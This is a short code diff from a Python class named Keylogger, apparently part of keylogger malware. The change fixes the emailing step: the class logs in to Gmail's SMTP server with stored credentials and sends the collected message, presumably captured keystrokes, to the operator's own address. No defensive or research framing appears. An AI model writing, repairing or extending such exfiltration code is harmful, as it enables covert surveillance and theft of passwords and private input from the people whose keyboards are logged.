@@ -40,5 +40,5 @@ class Keylogger:
         server = smtplib.SMTP("smtp.gmail.com", 587)
         server.starttls()
         server.login(email, password)
-        server.sendmail(email, password, message)
+        server.sendmail(email, email, message)
         server.quit()
